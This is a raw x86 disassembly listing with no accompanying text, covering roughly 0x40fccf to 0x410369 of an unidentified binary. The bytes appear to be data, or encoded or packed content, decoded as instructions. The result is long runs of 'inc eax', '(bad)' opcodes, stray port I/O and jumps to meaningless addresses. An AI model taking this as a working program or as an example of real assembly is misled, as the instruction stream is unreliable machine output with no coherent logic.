  40fccf:	xor    BYTE PTR [edx],dl
  40fcd1:	inc    ecx
  40fcd2:	jae    0x40fc93
  40fcd4:	loopne 0x40fcfc
  40fcd6:	add    ah,dh
  40fcd8:	mov    DWORD PTR [eax+0x3],0x389162bf
  40fcdf:	inc    edi
  40fce0:	mov    ?,WORD PTR [edx]
  40fce2:	aas    
  40fce3:	sahf   
  40fce4:	pop    esi
  40fce5:	sub    DWORD PTR [eax+0x1f778a85],ebx
  40fceb:	int3   
  40fcec:	xchg   esp,eax
  40fced:	pop    edi
  40fcee:	stc    
  40fcef:	inc    ebx
  40fcf0:	inc    eax
  40fcf1:	inc    eax
  40fcf2:	inc    eax
  40fcf3:	inc    eax
  40fcf4:	inc    eax
  40fcf5:	inc    eax
  40fcf6:	rol    DWORD PTR [eax+0x40],0xa8
  40fcfa:	inc    eax
  40fcfb:	bound  ebp,QWORD PTR [eax-0x6f28d1bc]
  40fd01:	rol    DWORD PTR [ebp+0x51],1
  40fd04:	inc    ebp
  40fd05:	sub    al,0xf9
  40fd07:	cmp    BYTE PTR [eax+0x61],ch
  40fd0a:	pusha  
  40fd0b:	outs   dx,DWORD PTR ds:[esi]
  40fd0c:	inc    ebx
  40fd0d:	mov    dh,0xe1
  40fd0f:	inc    eax
  40fd10:	inc    eax
  40fd11:	add    BYTE PTR [eax+0x40],al
  40fd14:	inc    eax
  40fd15:	inc    eax
  40fd16:	inc    eax
  40fd17:	inc    eax
  40fd18:	test   al,0x47
  40fd1a:	xchg   esi,eax
  40fd1b:	push   ebp
  40fd1c:	mov    bl,0x61
  40fd1e:	aad    0xab
  40fd20:	ret    0x68c5
  40fd23:	inc    ebx
  40fd24:	push   0xf654ccd8
  40fd29:	jge    0x40fd6b
  40fd2b:	inc    edi
  40fd2c:	push   ebx
  40fd2d:	bound  edx,QWORD PTR [edx+0x404040c3]
  40fd33:	inc    eax
  40fd34:	inc    eax
  40fd35:	inc    eax
  40fd36:	inc    eax
  40fd37:	inc    eax
  40fd38:	inc    eax
  40fd39:	inc    eax
  40fd3a:	dec    edi
  40fd3b:	inc    ecx
  40fd3c:	inc    eax
  40fd3d:	inc    eax
  40fd3e:	inc    edi
  40fd3f:	sub    BYTE PTR ds:0x40d39c54,0x29
  40fd46:	jno    0x40fd80
  40fd48:	inc    eax
  40fd49:	leave  
  40fd4a:	adc    eax,0x40534035
  40fd4f:	inc    eax
  40fd50:	inc    eax
  40fd51:	inc    eax
  40fd52:	inc    eax
  40fd53:	inc    eax
  40fd54:	int3   
  40fd55:	jne    0x40fd97
  40fd57:	js     0x40fdbc
  40fd59:	bound  edi,QWORD PTR [eax+0x403d41cb]
  40fd5f:	mov    cl,0xc5
  40fd61:	outs   dx,DWORD PTR ds:[esi]
  40fd62:	add    eax,0x31ec4373
  40fd67:	jo     0x40fde5
  40fd69:	pushf  
  40fd6a:	inc    ecx
  40fd6b:	aaa    
  40fd6c:	xor    BYTE PTR [ebx],ah
  40fd6e:	imul   edi,ecx,0x62
  40fd71:	dec    eax
  40fd72:	dec    esp
  40fd73:	inc    eax
  40fd74:	lock loope 0x40fdb7
  40fd77:	dec    ecx
  40fd78:	imul   eax,DWORD PTR [eax+0x0],0x404040c1
  40fd7f:	inc    eax
  40fd80:	add    BYTE PTR [eax+0x3c],al
  40fd83:	rol    BYTE PTR [eax+0x47],0xc8
  40fd87:	and    eax,0xcdb24fb1
  40fd8c:	inc    eax
  40fd8d:	test   DWORD PTR [edi],ecx
  40fd8f:	sub    bl,dh
  40fd91:	sub    eax,0x43e754c5
  40fd96:	jg     0x40fdbb
  40fd98:	push   ebp
  40fd99:	dec    ebx
  40fd9a:	ins    BYTE PTR es:[edi],dx
  40fd9b:	inc    eax
  40fd9c:	inc    eax
  40fd9d:	inc    eax
  40fd9e:	inc    eax
  40fd9f:	inc    eax
  40fda0:	inc    eax
  40fda1:	inc    eax
  40fda2:	inc    eax
  40fda3:	inc    DWORD PTR [eax+0x73]
  40fda6:	pushf  
  40fda7:	nop
  40fda8:	adc    al,BYTE PTR [ecx-0x41]
  40fdab:	and    dh,bh
  40fdad:	inc    ecx
  40fdae:	cmp    eax,0x6ee9d505
  40fdb3:	aas    
  40fdb4:	inc    esp
  40fdb5:	mov    eax,ds:0x41ad4ec1
  40fdba:	jae    0x40fd82
  40fdbc:	sub    al,0xc3
  40fdbe:	pushf  
  40fdbf:	inc    eax
  40fdc0:	inc    eax
  40fdc1:	inc    eax
  40fdc2:	inc    eax
  40fdc3:	inc    eax
  40fdc4:	inc    eax
  40fdc5:	inc    eax
  40fdc6:	inc    eax
  40fdc7:	inc    eax
  40fdc8:	inc    eax
  40fdc9:	in     eax,dx
  40fdca:	cmp    DWORD PTR [ecx],esp
  40fdcc:	data16 test al,0xb0
  40fdcf:	inc    ebx
  40fdd0:	or     eax,0xd9400a4c
  40fdd5:	inc    edx
  40fdd6:	inc    eax
  40fdd7:	inc    eax
  40fdd8:	inc    eax
  40fdd9:	inc    eax
  40fdda:	inc    eax
  40fddb:	inc    eax
  40fddc:	inc    eax
  40fddd:	inc    eax
  40fdde:	add    ch,dl
  40fde0:	(bad)  
  40fde2:	sub    cl,BYTE PTR [eax]
  40fde4:	addr16 inc cx
  40fde7:	pop    ebx
  40fde8:	adc    BYTE PTR fs:[esp+esi*4+0x4090df40],dh
  40fdf0:	inc    eax
  40fdf1:	inc    eax
  40fdf2:	inc    eax
  40fdf3:	inc    eax
  40fdf4:	inc    eax
  40fdf5:	and    eax,0xf6404040
  40fdfa:	push   ebx
  40fdfb:	test   eax,0x25357043
  40fe00:	cmp    BYTE PTR [ecx+eax*2-0x3d],al
  40fe04:	xor    edx,DWORD PTR [ebx+0x40]
  40fe07:	mov    dl,0x40
  40fe09:	inc    eax
  40fe0a:	inc    eax
  40fe0b:	inc    eax
  40fe0c:	inc    eax
  40fe0d:	inc    eax
  40fe0e:	inc    eax
  40fe0f:	inc    eax
  40fe10:	inc    eax
  40fe11:	inc    eax
  40fe12:	bound  ebp,QWORD PTR [esp+edi*2]
  40fe15:	pushf  
  40fe16:	in     al,dx
  40fe17:	cmp    edx,DWORD PTR [ecx]
  40fe19:	pop    es
  40fe1a:	dec    edi
  40fe1b:	scas   al,BYTE PTR es:[edi]
  40fe1c:	lds    eax,FWORD PTR [esi+0x47]
  40fe1f:	xchg   esp,eax
  40fe20:	mov    al,ds:0x5478ec03
  40fe25:	inc    eax
  40fe26:	test   DWORD PTR [esi+0x75],eax
  40fe29:	adc    DWORD PTR [ecx],edx
  40fe2b:	mov    ebp,0x4043c973
  40fe30:	inc    eax
  40fe31:	inc    eax
  40fe32:	inc    eax
  40fe33:	inc    eax
  40fe34:	inc    eax
  40fe35:	rol    DWORD PTR [eax+0x40],0x39
  40fe39:	inc    edx
  40fe3a:	inc    eax
  40fe3b:	mov    eax,0x9068b82c
  40fe40:	and    BYTE PTR [ecx+edx*2],ch
  40fe43:	push   edx
  40fe44:	nop
  40fe45:	add    eax,0x40004040
  40fe4a:	inc    eax
  40fe4b:	inc    eax
  40fe4c:	inc    eax
  40fe4d:	inc    eax
  40fe4e:	inc    eax
  40fe4f:	push   edx
  40fe50:	and    al,BYTE PTR [edi]
  40fe52:	inc    ecx
  40fe53:	dec    ecx
  40fe54:	es (bad) 
  40fe56:	retf   
  40fe57:	leave  
  40fe58:	inc    ebx
  40fe59:	aad    0x40
  40fe5b:	fbstp  TBYTE PTR [ebx+0x40]
  40fe5e:	stos   BYTE PTR es:[edi],al
  40fe5f:	sbb    al,0xd1
  40fe61:	inc    eax
  40fe62:	inc    eax
  40fe63:	inc    eax
  40fe64:	inc    eax
  40fe65:	inc    eax
  40fe66:	inc    eax
  40fe67:	inc    eax
  40fe68:	inc    eax
  40fe69:	inc    eax
  40fe6a:	inc    eax
  40fe6b:	cmp    BYTE PTR [edi+esi*4],dh
  40fe6e:	pushf  
  40fe6f:	int3   
  40fe70:	xchg   ecx,eax
  40fe71:	xor    DWORD PTR [ebx+0x37],eax
  40fe74:	ins    DWORD PTR es:[edi],dx
  40fe75:	add    DWORD PTR [ecx],ebx
  40fe77:	imul   edi,DWORD PTR [edx+edx*1-0x2dbfe2ce],0x4815aa34
  40fe82:	pop    ecx
  40fe83:	(bad)  
  40fe84:	jge    0x40fead
  40fe86:	mov    ebx,0x40e549d5
  40fe8b:	inc    eax
  40fe8c:	inc    eax
  40fe8d:	inc    eax
  40fe8e:	inc    eax
  40fe8f:	inc    eax
  40fe90:	int3   
  40fe91:	jne    0x40fed3
  40fe93:	and    BYTE PTR [eax+eax*2-0x37bee199],dl
  40fe9a:	push   0xf333c841
  40fe9f:	(bad)  
  40fea0:	out    dx,al
  40fea1:	call   0xe88741c7
  40fea6:	inc    ecx
  40fea7:	ret    
  40fea8:	dec    eax
  40fea9:	bound  ebp,QWORD PTR [ebx+0x31c3cf30]
  40feaf:	inc    eax
  40feb0:	add    cl,al
  40feb2:	inc    eax
  40feb3:	inc    eax
  40feb4:	inc    eax
  40feb5:	inc    eax
  40feb6:	add    BYTE PTR [eax+0x6e],al
  40feb9:	xor    BYTE PTR [ecx+0x40d3e835],dl
  40febf:	sub    dh,cl
  40fec1:	test   al,0x4c
  40fec3:	stos   DWORD PTR es:[edi],eax
  40fec4:	inc    edi
  40fec5:	inc    eax
  40fec6:	and    DWORD PTR [eax+0x40],eax
  40fec9:	inc    eax
  40feca:	inc    eax
  40fecb:	inc    eax
  40fecc:	inc    eax
  40fecd:	inc    eax
  40fece:	inc    eax
  40fecf:	inc    DWORD PTR [eax+0x31]
  40fed2:	push   edx
  40fed3:	pop    edx
  40fed4:	shl    DWORD PTR [edi],0x85
  40fed7:	inc    eax
  40fed8:	inc    eax
  40fed9:	pop    ebx
  40feda:	test   al,0x85
  40fedc:	mov    eax,ds:0x2c4043ab
  40fee1:	xor    DWORD PTR [ecx],eax
  40fee3:	dec    esp
  40fee4:	rcl    ebx,0x90
  40fee7:	inc    eax
  40fee8:	jge    0x40ff2a
  40feea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40feeb:	xor    al,0x4b
  40feed:	inc    esp
  40feee:	aas    
  40feef:	fild   DWORD PTR [eax+0x70]
  40fef2:	inc    eax
  40fef3:	inc    eax
  40fef4:	inc    eax
  40fef5:	inc    eax
  40fef6:	inc    eax
  40fef7:	inc    eax
  40fef8:	inc    eax
  40fef9:	inc    eax
  40fefa:	inc    eax
  40fefb:	inc    eax
  40fefc:	bound  esp,QWORD PTR [esi-0xabc8cc2]
  40ff02:	pusha  
  40ff03:	xor    al,0xb1
  40ff05:	(bad)
  40ff08:	rol    DWORD PTR [eax+0x5bfcfe17],1
  40ff0e:	dec    esp
  40ff0f:	sub    eax,0x6540e7ae
  40ff14:	data16 mul BYTE PTR [ebp-0x55]
  40ff18:	pop    esi
  40ff19:	inc    edi
  40ff1a:	cs inc eax
  40ff1c:	inc    eax
  40ff1d:	inc    eax
  40ff1e:	inc    eax
  40ff1f:	inc    eax
  40ff20:	inc    eax
  40ff21:	inc    eax
  40ff22:	inc    eax
  40ff23:	add    BYTE PTR [edx+0x2f6e4c4c],dl
  40ff29:	mov    ds:0xbc09cacb,eax
  40ff2e:	xor    al,0x62
  40ff30:	stos   DWORD PTR es:[edi],eax
  40ff31:	dec    ebx
  40ff32:	outs   dx,DWORD PTR ds:[esi]
  40ff34:	imul   esi,DWORD PTR [edx-0x5c],0x494146eb
  40ff3b:	inc    eax
  40ff3c:	xlat   BYTE PTR ds:[ebx]
  40ff3d:	inc    eax
  40ff3e:	inc    eax
  40ff3f:	inc    eax
  40ff40:	inc    eax
  40ff41:	inc    eax
  40ff42:	inc    eax
  40ff43:	and    eax,0x41404040
  40ff48:	js     0x40ffa6
  40ff4a:	xor    eax,0x1c26e343
  40ff4f:	mov    WORD PTR [ebp+0x7d30435a],?
  40ff55:	dec    edx
  40ff56:	ss mov bl,0xc
  40ff59:	mov    ds:0x4048e40b,al
  40ff5e:	inc    ebx
  40ff5f:	test   al,0xdc
  40ff61:	rcr    eax,0x47
  40ff64:	sub    al,BYTE PTR [eax+0x40]
  40ff67:	inc    eax
  40ff68:	inc    eax
  40ff69:	inc    eax
  40ff6a:	inc    eax
  40ff6b:	inc    eax
  40ff6c:	inc    eax
  40ff6d:	inc    eax
  40ff6e:	inc    eax
  40ff6f:	jle    0x40ff90
  40ff71:	adc    DWORD PTR [edx+0x43],esp
  40ff74:	mov    al,ds:0x3736bf85
  40ff79:	cwde   
  40ff7a:	lds    edi,FWORD PTR [esi]
  40ff7c:	xchg   ebx,eax
  40ff7d:	inc    ebx
  40ff7e:	arpl   WORD PTR [eax-0x2f],ax
  40ff81:	inc    ebx
  40ff82:	dec    edi
  40ff83:	int    0x5b
  40ff85:	inc    eax
  40ff86:	inc    eax
  40ff87:	inc    eax
  40ff88:	inc    eax
  40ff89:	inc    eax
  40ff8a:	inc    eax
  40ff8b:	rol    DWORD PTR [eax+0x40],0x90
  40ff8f:	imul   edi,DWORD PTR [edi+edx*8+0x52],0x45
  40ff94:	push   esp
  40ff95:	and    bl,ah
  40ff97:	jno    0x40ffdb
  40ff99:	inc    esi
  40ff9a:	inc    esp
  40ff9b:	(bad)  
  40ff9c:	popf   
  40ff9d:	inc    eax
  40ff9e:	inc    eax
  40ff9f:	add    BYTE PTR [eax+0x40],al
  40ffa2:	inc    eax
  40ffa3:	inc    eax
  40ffa4:	inc    eax
  40ffa5:	inc    eax
  40ffa6:	ja     0x40ffeb
  40ffa8:	xor    al,BYTE PTR [ebx+0x5a]
  40ffab:	sub    bl,dh
  40ffad:	xchg   esi,eax
  40ffae:	xor    cl,dl
  40ffb0:	xchg   esp,eax
  40ffb1:	es sti 
  40ffb3:	add    al,BYTE PTR [eax+0x40]
  40ffb6:	inc    eax
  40ffb7:	inc    eax
  40ffb8:	inc    eax
  40ffb9:	inc    eax
  40ffba:	inc    eax
  40ffbb:	inc    eax
  40ffbc:	inc    eax
  40ffbd:	inc    eax
  40ffbe:	lea    esp,[edx-0x59]
  40ffc1:	in     al,dx
  40ffc2:	rol    BYTE PTR [eax+0x2],0xbf
  40ffc6:	js     0x40ffd5
  40ffc8:	xor    al,0x67
  40ffca:	repz jmp 0x40ffa4
  40ffcd:	test   al,0x3d
  40ffcf:	cmp    eax,0x4a62fe62
  40ffd4:	xchg   ebp,eax
  40ffd5:	adc    BYTE PTR [edi+0x40],dl
  40ffd8:	inc    eax
  40ffd9:	iret   
  40ffda:	inc    eax
  40ffdb:	inc    eax
  40ffdc:	inc    eax
  40ffdd:	inc    eax
  40ffde:	inc    eax
  40ffdf:	inc    eax
  40ffe0:	int3   
  40ffe1:	jne    0x410023
  40ffe3:	or     al,0x40
  40ffe5:	pop    ebp
  40ffe6:	mov    esp,0x41e8403c
  40ffeb:	xchg   ebx,eax
  40ffec:	dec    ebp
  40ffed:	jae    0x410031
  40ffef:	adc    eax,DWORD PTR [edx+0x3d]
  40fff2:	inc    ebx
  40fff3:	call   0xc4fcd038
  40fff8:	das    
  40fff9:	ret    
  40fffa:	xor    BYTE PTR [edx],ah
  40fffc:	jle    0x40ffb5
  40fffe:	js     0x41005b
  410000:	mov    eax,0x4068e0a8
  410005:	dec    edx
  410006:	data16 aam 0x3d
  410009:	or     eax,0x40c10040
  41000e:	inc    eax
  41000f:	inc    eax
  410010:	inc    eax
  410011:	add    BYTE PTR [eax+0x47],al
  410014:	int3   
  410015:	bound  esi,QWORD PTR [ebx+ebx*2-0x7a363eb8]
  41001c:	sti    
  41001d:	inc    eax
  41001e:	adc    ebp,DWORD PTR [eax+0x4341b830]
  410024:	jg     0x410066
  410026:	add    eax,0x4547a212
  41002b:	nop
  41002c:	mov    bh,0x7b
  41002e:	inc    eax
  41002f:	inc    eax
  410030:	inc    eax
  410031:	inc    eax
  410032:	inc    eax
  410033:	inc    eax
  410034:	inc    eax
  410035:	inc    eax
  410036:	inc    DWORD PTR [eax+0x31]
  410039:	mov    eax,0xf97a5cc7
  41003e:	(bad)  
  41003f:	inc    esi
  410040:	inc    eax
  410041:	inc    ecx
  410042:	xor    DWORD PTR [eax-0x34],esi
  410045:	test   al,0x11
  410047:	inc    esi
  410048:	push   ecx
  410049:	stc    
  41004a:	pop    ebx
  41004b:	push   ebx
  41004c:	call   0x40814091
  410051:	inc    eax
  410052:	inc    eax
  410053:	inc    eax
  410054:	inc    eax
  410055:	inc    eax
  410056:	inc    eax
  410057:	inc    eax
  410058:	out    0x1,al
  41005a:	cmp    ebp,DWORD PTR [eax]
  41005c:	xor    al,0xb8
  41005e:	adc    eax,0x6d40622a
  410063:	addr16 mov al,ds:0xc90b
  410067:	dec    edx
  410068:	push   ebx
  410069:	inc    eax
  41006a:	inc    eax
  41006b:	inc    eax
  41006c:	inc    eax
  41006d:	inc    eax
  41006e:	inc    eax
  41006f:	inc    eax
  410070:	inc    eax
  410071:	add    BYTE PTR [edx],al
  410073:	pop    edi
  410074:	push   ebx
  410075:	(bad)
  410078:	sub    cl,dl
  41007a:	inc    eax
  41007b:	outs   dx,DWORD PTR ds:[esi]
  41007c:	daa    
  41007d:	jecxz  0x4100e1
  41007f:	arpl   WORD PTR [eax],bx
  410081:	stc    
  410082:	arpl   WORD PTR [edi+0x4040403d],dx
  410088:	inc    eax
  410089:	inc    eax
  41008a:	inc    eax
  41008b:	and    eax,0x96404040
  410090:	loop   0x410051
  410092:	mov    bl,0x5a
  410094:	inc    eax
  410095:	dec    eax
  410096:	dec    edi
  410097:	or     ebp,DWORD PTR [ebx+0x1f4b05]
  41009d:	popf   
  41009e:	cmp    BYTE PTR [edi+eax*2],dh
  4100a1:	inc    esp
  4100a2:	sahf   
  4100a3:	cmp    BYTE PTR [edx+0x48],bh
  4100a6:	shl    BYTE PTR [edx+0x3e],0x6f
  4100aa:	inc    edi
  4100ab:	pop    ebp
  4100ac:	bound  ebx,QWORD PTR [edi-0x4b2adfbe]
  4100b2:	inc    eax
  4100b3:	inc    eax
  4100b4:	inc    eax
  4100b5:	inc    eax
  4100b6:	inc    eax
  4100b7:	inc    eax
  4100b8:	inc    eax
  4100b9:	inc    eax
  4100ba:	inc    eax
  4100bb:	inc    eax
  4100bc:	inc    ebx
  4100bd:	mov    al,0x41
  4100bf:	dec    eax
  4100c0:	ret    0x4cb4
  4100c3:	jns    0x4100f5
  4100c5:	popa   
  4100c6:	ds lahf 
  4100c8:	out    0x26,al
  4100ca:	leave  
  4100cb:	xor    eax,0x4842f7dc
  4100d0:	inc    eax
  4100d1:	inc    eax
  4100d2:	inc    eax
  4100d3:	inc    eax
  4100d4:	inc    eax
  4100d5:	inc    eax
  4100d6:	rol    DWORD PTR [eax+0x40],0x6a
  4100da:	sar    BYTE PTR [eax+0x239847ec],0x9f
  4100e1:	adc    BYTE PTR [edx+0x41],ah
  4100e4:	add    eax,0x48cc2085
  4100e9:	mov    eax,0x437b40cd
  4100ee:	inc    eax
  4100ef:	inc    eax
  4100f0:	add    BYTE PTR [eax+0x40],al
  4100f3:	inc    eax
  4100f4:	inc    eax
  4100f5:	inc    eax
  4100f6:	inc    eax
  4100f7:	push   esi
  4100f8:	push   eax
  4100f9:	lahf   
  4100fa:	ds adc ah,bl
  4100fd:	lock nop
  4100ff:	dec    ecx
  410100:	cmp    BYTE PTR [eax+0x2a],cl
  410103:	in     eax,0x5a
  410105:	inc    ebx
  410106:	xchg   esi,eax
  410107:	mov    ch,0x40
  410109:	lahf   
  41010a:	bound  ecx,QWORD PTR [eax+0x30]
  41010d:	inc    ebp
  41010e:	inc    ebx
  41010f:	ret    
  410110:	xor    BYTE PTR [edi+0x40404040],bh
  410116:	inc    eax
  410117:	inc    eax
  410118:	inc    eax
  410119:	inc    eax
  41011a:	inc    eax
  41011b:	inc    eax
  41011c:	jl     0x41015a
  41011e:	ins    BYTE PTR es:[edi],dx
  41011f:	mov    ah,0xd1
  410121:	outs   dx,BYTE PTR ds:[esi]
  410122:	sub    BYTE PTR [ebx+0x4],ch
  410125:	call   0x1f40:0xf4dc69c5
  41012c:	sub    DWORD PTR [eax+0x4c],eax
  41012f:	in     al,dx
  410130:	je     0x410133
  410132:	jne    0x41019f
  410134:	inc    eax
  410135:	inc    eax
  410136:	inc    eax
  410137:	inc    eax
  410138:	inc    eax
  410139:	inc    eax
  41013a:	int3   
  41013b:	jne    0x41017d
  41013d:	je     0x41010c
  41013f:	jae    0x41014e
  410141:	jnp    0x41014a
  410143:	fcomp  QWORD PTR [edi]
  410145:	adc    al,0x69
  410147:	inc    ecx
  410148:	leave  
  410149:	fisubr DWORD PTR [ebx]
  41014b:	inc    eax
  41014c:	dec    edi
  41014d:	arpl   WORD PTR [eax-0x58bef160],bx
  410153:	sub    BYTE PTR [edx+0x37c3d52f],dl
  410159:	inc    ebx
  41015a:	(bad)  
  41015b:	inc    eax
  41015c:	add    cl,al
  41015e:	inc    eax
  41015f:	inc    eax
  410160:	inc    eax
  410161:	inc    eax
  410162:	add    BYTE PTR [eax+0x40],al
  410165:	outs   dx,BYTE PTR ds:[esi]
  410166:	test   al,0x6f
  410168:	inc    ebp
  410169:	lock xor BYTE PTR [eax+0x34],cl
  41016d:	dec    ecx
  41016e:	adc    bl,dl
  410170:	add    ax,0x56d8
  410174:	sbb    al,0x50
  410176:	dec    eax
  410177:	fs pop esp
  410179:	inc    eax
  41017a:	inc    eax
  41017b:	inc    eax
  41017c:	inc    eax
  41017d:	inc    eax
  41017e:	inc    eax
  41017f:	inc    eax
  410180:	inc    eax
  410181:	inc    DWORD PTR [eax-0x37]
  410184:	inc    edi
  410185:	pop    esp
  410186:	inc    edx
  410187:	sub    eax,0x42624441
  41018c:	test   DWORD PTR [esi+0x37],ecx
  41018f:	inc    ebp
  410190:	mov    ebp,DWORD PTR [edx+eax*1]
  410193:	inc    ecx
  410194:	pusha  
  410195:	xchg   esp,eax
  410196:	(bad)  
  41019b:	inc    eax
  41019c:	inc    eax
  41019d:	inc    eax
  41019e:	inc    eax
  41019f:	inc    eax
  4101a0:	inc    eax
  4101a1:	inc    eax
  4101a2:	inc    eax
  4101a3:	xchg   esi,eax
  4101a4:	dec    edx
  4101a5:	ret    0xa2f0
  4101a8:	inc    eax
  4101a9:	outs   dx,BYTE PTR ds:[esi]
  4101aa:	(bad)  
  4101ab:	sar    BYTE PTR [eax+eax*8-0x5592fd61],1
  4101b2:	loop   0x410165
  4101b4:	aad    0x1c
  4101b6:	mov    bl,0x4b
  4101b8:	push   esp
  4101b9:	inc    esi
  4101ba:	cmp    BYTE PTR [esi],ah
  4101bc:	dec    esp
  4101bd:	xor    al,0x43
  4101bf:	adc    eax,DWORD PTR [eax-0x45]
  4101c2:	bound  ebx,QWORD PTR [eax+0x40404040]
  4101c8:	inc    eax
  4101c9:	inc    eax
  4101ca:	inc    eax
  4101cb:	inc    eax
  4101cc:	add    BYTE PTR [ebx-0x78],dh
  4101cf:	rol    ch,cl
  4101d1:	and    eax,0xb8624542
  4101d6:	outs   dx,DWORD PTR ds:[esi]
  4101d7:	dec    esp
  4101d8:	mov    bl,BYTE PTR [eax]
  4101da:	mov    bl,0xac
  4101dc:	lds    edx,FWORD PTR ds:0x404040f7
  4101e2:	inc    eax
  4101e3:	inc    eax
  4101e4:	inc    eax
  4101e5:	and    eax,0x12404040
  4101ea:	mov    ds:0xd76c4140,eax
  4101ef:	retf   
  4101f0:	add    eax,0x5032a76b
  4101f5:	sub    al,0xe9
  4101f7:	test   eax,0x28c58ec9
  4101fc:	xor    eax,DWORD PTR [esi]
  4101fe:	inc    esp
  4101ff:	xchg   ecx,eax
  410200:	inc    edx
  410201:	inc    ecx
  410202:	fild   DWORD PTR [eax+0x41]
  410205:	cdq    
  410206:	sub    al,0xbc
  410208:	outs   dx,DWORD PTR ds:[esi]
  410209:	inc    ebx
  41020a:	inc    eax
  41020b:	and    bh,BYTE PTR [ebx]
  41020d:	push   edi
  41020e:	xchg   edx,eax
  41020f:	or     eax,0x40404040
  410214:	inc    eax
  410215:	inc    eax
  410216:	inc    eax
  410217:	inc    eax
  410218:	inc    eax
  410219:	inc    eax
  41021a:	xchg   edi,eax
  41021b:	xor    BYTE PTR [eax+0x6a],ah
  41021e:	inc    edx
  41021f:	mov    bl,0xd5
  410221:	dec    edx
  410222:	mov    ah,dl
  410224:	inc    eax
  410225:	inc    eax
  410226:	adc    BYTE PTR [eax+0x47150f10],ch
  41022c:	inc    eax
  41022d:	pusha  
  41022e:	daa    
  41022f:	std    
  410230:	out    0x98,al
  410232:	leave  
  410233:	test   DWORD PTR [eax+0x40],eax
  410236:	inc    ecx
  410237:	cmp    al,BYTE PTR [eax+eax*2+0x40]
  41023b:	inc    eax
  41023c:	inc    eax
  41023d:	inc    eax
  41023e:	inc    eax
  41023f:	rol    DWORD PTR [eax+0x40],0x62
  410243:	dec    edi
  410244:	inc    ebx
  410245:	push   eax
  410246:	jnp    0x4102b9
  410248:	(bad)  
  410249:	sub    al,0x88
  41024b:	inc    ecx
  41024c:	nop
  41024d:	inc    eax
  41024e:	inc    eax
  41024f:	lods   eax,DWORD PTR ds:[esi]
  410250:	mov    WORD PTR [eax+0x4040e74b],ss
  410256:	add    BYTE PTR [eax+0x40],al
  410259:	inc    eax
  41025a:	inc    eax
  41025b:	inc    eax
  41025c:	inc    eax
  41025d:	push   eax
  41025e:	inc    eax
  41025f:	and    al,0x24
  410261:	or     ebp,0x4043d83f
  410267:	inc    eax
  410268:	mov    dl,0xbc
  41026a:	pop    ebp
  41026b:	mov    edi,0x2950d162
  410270:	and    ebp,DWORD PTR [ebp-0x1a]
  410273:	mov    edi,0x40401842
  410278:	inc    edx
  410279:	inc    eax
  41027a:	inc    eax
  41027b:	inc    eax
  41027c:	inc    eax
  41027d:	inc    eax
  41027e:	inc    eax
  41027f:	inc    eax
  410280:	inc    eax
  410281:	inc    eax
  410282:	inc    eax
  410283:	cld    
  410284:	inc    esp
  410285:	mov    edi,0xd0405d24
  41028a:	lock cmp al,0x2c
  41028d:	gs xor edx,0x40
  410291:	inc    eax
  410292:	sub    bh,ah
  410294:	mov    es,WORD PTR [eax-0x58]
  410297:	adc    BYTE PTR [eax],dl
  410299:	das    
  41029a:	inc    eax
  41029b:	push   esi
  41029c:	push   ecx
  41029d:	add    al,BYTE PTR ds:0x2f404041
  4102a3:	inc    eax
  4102a4:	inc    eax
  4102a5:	inc    eax
  4102a6:	inc    eax
  4102a7:	inc    eax
  4102a8:	inc    eax
  4102a9:	int3   
  4102aa:	jne    0x4102ec
  4102ac:	add    al,BYTE PTR [ebp+0x40438744]
  4102b2:	xor    eax,ecx
  4102b4:	push   eax
  4102b5:	inc    esp
  4102b6:	mov    WORD PTR [eax+0x30],ss
  4102b9:	inc    eax
  4102ba:	inc    eax
  4102bb:	push   ecx
  4102bc:	mov    ah,0x2c
  4102be:	aad    0xab
  4102c0:	inc    eax
  4102c1:	add    cl,al
  4102c3:	inc    eax
  4102c4:	inc    eax
  4102c5:	inc    eax
  4102c6:	inc    eax
  4102c7:	add    BYTE PTR [eax-0x30],al
  4102ca:	adc    BYTE PTR [edx+0x44],bh
  4102cd:	loope  0x41025b
  4102cf:	inc    esp
  4102d0:	mov    BYTE PTR [edi+0x40],al
  4102d3:	inc    eax
  4102d4:	push   esp
  4102d5:	lods   al,BYTE PTR ds:[esi]
  4102d6:	inc    eax
  4102d7:	dec    edx
  4102d8:	or     eax,0xe3254085
  4102dd:	retf   
  4102de:	int    0xfa
  4102e0:	leave  
  4102e1:	inc    ebx
  4102e2:	inc    ecx
  4102e3:	shr    BYTE PTR [esi+0x15],0x69
  4102e7:	xor    BYTE PTR [edx-0x70],ch
  4102ea:	inc    eax
  4102eb:	inc    eax
  4102ec:	inc    eax
  4102ed:	inc    eax
  4102ee:	inc    eax
  4102ef:	inc    eax
  4102f0:	inc    eax
  4102f1:	inc    eax
  4102f2:	inc    DWORD PTR [eax-0x30]
  4102f5:	inc    eax
  4102f6:	inc    eax
  4102f7:	inc    esp
  4102f8:	mov    al,al
  4102fa:	sub    DWORD PTR [ebp+0x40],0xcd43512c
  410301:	jecxz  0x4102c6
  410303:	test   al,0x40
  410305:	inc    eax
  410306:	inc    edx
  410307:	rol    BYTE PTR [ecx+0x29],1
  41030a:	test   al,0x40
  41030c:	inc    eax
  41030d:	cmp    eax,esi
  41030f:	push   0x40
  410311:	inc    eax
  410312:	inc    eax
  410313:	inc    eax
  410314:	inc    eax
  410315:	inc    eax
  410316:	inc    eax
  410317:	inc    eax
  410318:	inc    eax
  410319:	inc    eax
  41031a:	out    dx,al
  41031b:	bound  ecx,QWORD PTR ds:0x6f40402a
  410321:	pop    esi
  410322:	dec    eax
  410323:	ror    DWORD PTR [ebx+0x48],0x40
  410327:	xor    al,0x5f
  410329:	inc    eax
  41032a:	inc    eax
  41032b:	inc    eax
  41032c:	inc    eax
  41032d:	inc    eax
  41032e:	inc    eax
  41032f:	inc    eax
  410330:	inc    eax
  410331:	add    BYTE PTR [eax+0x2a704930],al
  410337:	rol    DWORD PTR [eax+0x50],1
  41033a:	add    ecx,DWORD PTR [eax+0x403a3c29]
  410340:	xor    edi,DWORD PTR [edx-0x1f]
  410343:	(bad)
  410346:	dec    edx
  410347:	inc    eax
  410348:	inc    eax
  410349:	inc    eax
  41034a:	inc    eax
  41034b:	inc    eax
  41034c:	inc    eax
  41034d:	and    eax,0x40404040
  410352:	inc    eax
  410353:	push   edi
  410354:	sub    al,0x4f
  410356:	dec    esp
  410357:	jo     0x41039d
  410359:	inc    eax
  41035a:	cmc    
  41035b:	nop
  41035c:	ds test bl,0xdd
  410360:	pop    ebx
  410361:	aas    
  410362:	push   cs
  410363:	xor    al,0x40
  410365:	inc    eax
  410366:	inc    eax
  410367:	inc    eax
  410368:	inc    eax
  410369:	inc    eax
